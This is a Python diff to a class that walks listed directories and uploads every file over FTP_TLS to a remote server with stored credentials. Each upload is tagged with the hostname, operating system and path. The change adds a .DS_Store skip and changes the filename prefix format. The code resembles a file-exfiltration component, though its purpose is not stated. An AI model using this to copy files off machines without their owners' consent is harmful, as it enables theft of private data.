@@ -41,27 +41,30 @@ class dirFile:
     def ftpHandle(self, path, count, inform):
         _, _, filenames = next(walk(path), (None, None, []))
         for l in filenames:
-            self.message.append(f"{self.code}#{self.name}|||{socket.gethostname()}|||{platform.system()}-{platform.release()}|||{path}|||{l}|||{inform}")
-            ftp=ftplib.FTP_TLS()
-            ftp.connect(self._ip, self._port)
-            ftp.login(self.user, self.passwd)
-            ftp.prot_p()
-            ftp.cwd('/')
-            #all_file_ftp = []
-            #ftp.dir(all_file_ftp.append)
-            name_file = f"{inform}{l}"
-            #all_file_ftp = self.convertNoneType(all_file_ftp)
-            content_file = open(os.path.join(path, l), 'rb')
-            ftp.storbinary('STOR '+ name_file, content_file)
-            content_file.close()
-            ftp.quit()
+            if l != ".DS_Store":
+                ftp=ftplib.FTP_TLS()
+                ftp.connect(self._ip, self._port)
+                ftp.login(self.user, self.passwd)
+                ftp.prot_p()
+                ftp.cwd('/')
+                #all_file_ftp = []
+                #ftp.dir(all_file_ftp.append)
+                name_file = f"{inform}{l}"
+                #all_file_ftp = self.convertNoneType(all_file_ftp)
+                content_file = open(os.path.join(path, l), 'rb')
+                ftp.storbinary('STOR '+ name_file, content_file)
+                content_file.close()
+                ftp.quit()
+                self.message.append(f"{self.code}#{self.name}|||{socket.gethostname()}|||{platform.system()}-{platform.release()}|||{path}|||{l}|||{inform}")
+            else:
+                pass
 
     def run(self):
         for i in range(len(self._path)):
             inform = ""
             if len(str(i)) == 1:
-                inform = f"{self.code}00{i+1}@{self.name}@"
+                inform = f"{self.code}@00{i+1}@{self.name}@"
             elif len(str(i)) == 2:
-                inform = f"{self.code}0{i+1}@{self.name}@"
+                inform = f"{self.code}@0{i+1}@{self.name}@"
             self.ftpHandle(self._path[i], i, inform)
         return self.message
